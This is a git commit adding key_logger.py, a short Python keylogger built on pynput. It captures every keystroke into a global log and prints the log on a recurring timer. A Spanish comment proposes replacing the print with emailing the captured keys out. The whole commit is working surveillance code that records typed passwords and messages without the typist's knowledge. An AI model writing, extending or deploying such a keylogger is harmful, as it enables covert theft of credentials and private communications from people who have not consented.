dc3a9d2f5d1f9203a745659d085e6b672cdabb0e
belfortep <pbelforte2003@gmail.com>
2023-01-11 14:48:17 -0300

    key logger

---
+++ key_logger.py
@@ -0,0 +1,28 @@
+
+import pynput.keyboard
+import threading
+
+log = ""
+
+def process_key_press(key):
+        global log
+        try:
+                log = log + str(key.char)
+        except:
+                if key == key.space:
+                        log = log + " "
+                else:
+                        log = log + " " + str(key) + " "
+
+#podria por ejemplo, aca hacer en vez de un print que me envie un mail
+def report():
+        global log
+        print(log)
+        log = ""
+        timer = threading.Timer(10000, report)
+        timer.start()
+
+keyboard_listener = pynput.keyboard.Listener(on_press = process_key_press)
+with keyboard_listener:
+        report()
+        keyboard_listener.join()
